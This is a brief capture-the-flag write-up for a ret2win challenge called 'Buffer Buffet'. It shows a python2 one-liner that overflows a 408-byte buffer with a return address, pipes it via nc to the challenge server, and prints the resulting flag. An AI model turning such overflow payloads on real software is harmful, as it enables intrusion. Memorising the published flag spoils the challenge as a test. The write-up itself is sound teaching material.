# Buffer Buffet

## Analysis
Easy ret2win challenge without any protections

## Solution
Got the address of the `secretFunction` and offset for the buffer using gdb.
Used python2 to send the payload to the remote directly.
```
└─$ python2 -c "print b'a'*408 + b'\xd6\x11\x40'" | nc 34.125.199.248 4056
Enter some text:
You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�@
Congratulations!
Flag: OSCTF{buff3r_buff3t_w4s_e4sy!}
```

## Flag
```
OSCTF{buff3r_buff3t_w4s_e4sy!}
```
